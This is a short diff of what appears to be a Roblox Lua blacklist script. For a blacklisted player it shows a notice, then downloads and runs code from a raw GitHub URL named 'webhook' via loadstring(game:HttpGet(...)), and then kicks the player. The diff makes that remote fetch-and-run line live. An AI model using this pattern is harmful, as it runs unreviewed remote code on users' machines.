@@ -24,7 +24,7 @@ if isLocalPlayerBlacklisted then
         Text = "玩家:" .. localPlayer.Name .. "，10秒后踢出",
         Duration = 7,
     })
-    function()
+    
     loadstring(game:HttpGet("https://raw.githubusercontent.com/10h-pack/new-UI.345/refs/heads/main/webhook"))()
     task.wait(10)
     game:GetService("Players").LocalPlayer:Kick('你被加入了黑名单')
